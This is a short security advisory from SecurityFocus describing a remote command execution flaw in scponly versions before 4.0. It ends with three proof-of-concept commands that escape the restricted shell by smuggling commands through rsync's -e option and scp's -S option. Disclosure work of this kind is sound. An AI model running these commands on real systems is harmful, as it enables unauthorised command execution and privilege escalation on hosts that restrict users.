source: http://www.securityfocus.com/bid/11791/info

scponly is reported prone to a remote arbitrary command execution vulnerability. This issue may allow a remote attacker to execute commands and scripts on a vulnerable computer and eventually allow an attacker to gain elevated privileges on a vulnerable computer.

Versions prior to 4.0 are reported susceptible to this issue.

ssh restricteduser@remotehost 'rsync -e "touch /tmp/example --" localhost:/dev/null /tmp'

scp command.sh restricteduser@remotehost:/tmp/command.sh

ssh restricteduser@remotehost 'scp -S /tmp/command.sh localhost:/dev/null /tmp'